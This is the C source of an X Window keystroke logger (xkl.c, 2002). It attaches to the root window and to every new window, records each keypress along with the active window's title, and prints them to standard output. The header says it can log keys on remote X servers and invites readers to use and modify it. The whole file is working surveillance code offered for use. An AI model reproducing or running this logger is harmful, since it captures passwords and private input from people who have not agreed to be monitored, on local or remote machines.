
/*
 *   xkl.c,v 0.5-alfa 2002/12/14
 */

/*
 *   This program is designed to log key strokes in X Window system.
 *   It is able to log keys not only local machine, but on remote
 *   as well.
 *
 *   Fill free to modify or use this source code.
 *
 *   Author: Edward Gess
 */



/*
 *   Includes
 */
#include <stdio.h>
#include <X11/X.h>
#include <X11/Xlib.h>

/*
 *   Globals
 */
static Display *display;

/*
 *   Function prototypes
 */
void forceprint(const char *);
int xerrorhandler(Display *,XErrorEvent *);

/*
 *   main() - program entry point.
 */
int main(int argc,char **argv)
{
    char *hn=NULL; /*   default address--local X server   */
    Window rw;     /*   root window   */
    XEvent xevent; /*   event received from the X server   */
    int length;
    KeySym keysym;
    char keybuf[256];
    char *keystring;
    char *act_win_name; /*   name of the active window   */
    XWindowAttributes xwndattr;
    char buf[32];



    if (argc==2) /*   are there any arguments specified?   */
	hn=argv[1]; /*   if specified, change address of X server   */

    display=XOpenDisplay(hn); /*   try to connect to the X server   */

    if (display==NULL) {
	fprintf(stderr,"unable to open display: %s\n",hn);
	exit(1); /*   exit program   */
    }

    XSetErrorHandler(xerrorhandler);
    rw=DefaultRootWindow(display);

    XSelectInput(display,rw,
		 KeyPressMask|SubstructureNotifyMask|EnterWindowMask);

    for (;;) { /*   start enless loop which handles events   */
	XNextEvent(display,&xevent);

	switch (xevent.type) {

	case CreateNotify:
	    XSelectInput(display,xevent.xcreatewindow.window,
			 KeyPressMask|SubstructureNotifyMask|EnterWindowMask);

	    XGetWindowAttributes(display,xevent.xcreatewindow.window,
				 &xwndattr);
	    sprintf(buf,"\n---(0x%x)---\n",xwndattr.do_not_propagate_mask);
	    forceprint(buf);

	    sprintf(buf,xwndattr.override_redirect?"TRUE\n":"FALSE\n");
	    forceprint(buf);

	    break;

	case KeyPress:
	case KeyRelease:
	    length=XLookupString((XKeyEvent *)&xevent,keybuf,sizeof(keybuf),
				 &keysym,False);
	    keybuf[length]='\0';
	    keystring=XKeysymToString(keysym);

	    if (keystring) {

		if (strlen(keystring)>1) {

		    if (strcmp(keystring,"Return")==0)
			keystring="\n";

		    sprintf(keybuf,strlen(keystring)>1?"<%s>":"%s",keystring);
		} else
		    sprintf(keybuf,"%s",keystring);

		forceprint(keybuf);
	    } /* if (...) */
	    break;

	case EnterNotify:
	    if (XFetchName(display,xevent.xfocus.window,&act_win_name)) {
		forceprint("---[");
		forceprint(act_win_name);
		forceprint("]---\n");
	    }
	    break;

	case MotionNotify:
	    forceprint(".");
	    break;

	default:
	    continue;
	} /* switch (...) */
    } /* for (...) */
}

/*
 *   Function implementations
 */
void forceprint(const char *str)
{
    fprintf(stdout,"%s",str);
    fflush(stdout);
}

int xerrorhandler(Display *display,XErrorEvent *error_event)
{
    //forceprint("\nERROR OCCURED\n");
}
